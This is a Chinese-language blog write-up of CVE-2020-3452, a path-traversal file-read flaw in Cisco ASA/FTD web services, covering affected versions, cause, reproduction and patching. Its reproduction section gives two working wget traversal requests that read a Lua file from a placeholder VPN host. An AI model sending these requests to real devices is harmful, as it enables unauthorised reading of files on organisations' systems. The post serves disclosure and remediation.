# CVE-2020-3452 CISCO ASA 远程任意文件读取漏洞 - 安全研究者的日常 - 博客园

> 原文：[`www.cnblogs.com/A66666/p/36458e4b49c60ce390394c8b11459e6a.html`](https://www.cnblogs.com/A66666/p/36458e4b49c60ce390394c8b11459e6a.html)

**0x01 漏洞描述**
    Cisco 官方 发布了 Cisco ASA 软件和 FTD 软件的 Web 接口存在目录遍历导致任意文件读取 的风险通告，该漏洞编号为 CVE-2020-3452。    漏洞等级：**中危**。**通过 shadon 引擎的搜索，目前全球大约有 210,685 个资产为** ![](img/76a5be54705024849179d1b4783d8e8c.png) 该漏洞目前仅影响启用了 AnyConnect 或 WebVPN 配置的设备，并且此漏洞不能用于访问 ASA 或 FTD 系统文件或底层操作系统(OS)文件。

## 0x02 影响版本

*   Cisco ASA：<= 9.6
*   Cisco ASA：9.7 , 9.8 , 9.9 , 9.10 , 9.12 , 9.13 , 9.14
*   Cisco FTD：6.2.2 , 6.2.3 , 6.3.0 , 6.4.0 , 6.5.0 , 6.6.0

## 0x03 漏洞原理

        Cisco Adaptive Security Appliance (ASA) 和 Cisco Firepower Threat Defense (FTD) 的 web 服务接口存在漏洞，允许未经身份验证的远程攻击者向受影响的设备发送一个精心制作的 HTTP 请求，成功利用该漏洞的攻击者能够进行目录遍历攻击并读取目标系统上的敏感文件。

## **0x04 漏洞复现**

    漏洞主要是可以通过接口构造特定请求来实现攻击。
    漏洞的验证方式是可以读取相关的文件来验证，如：
   wget https://vpn.target.local:443/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../   wget [`vpn.target.local:443/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua`](https://vpn.target.local:443/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua)    这里构造了数据包进行验证。
![](img/27eec8fbbbd18bc15778cb5440d82cc8.png)

## 0x05 漏洞修复

安装`Cisco ASA/TFD` 最新补丁，进行补丁升级。具体可以参考：[`tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86`](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86)![](img/c2bd4f7e5c21ee28ce9498a82d90c368.png)![](img/05b9a8ac7ac340ecd40018a46c620313.png)参考链接[`twitter.com/aboul3la/status/1286809567989575685`](https://twitter.com/aboul3la/status/1286809567989575685)
[`tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86`](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86)
[`cert.360.cn/warning/detail?id=df808745e4d55c3847099a7048c8f86a`](https://cert.360.cn/warning/detail?id=df808745e4d55c3847099a7048c8f86a)
![](img/fb398329f110f1d1a5d5cd41f1ecda1d.png)<wiz_tmp_tag id="wiz-table-range-border" contenteditable="false" style="display: none"></wiz_tmp_tag>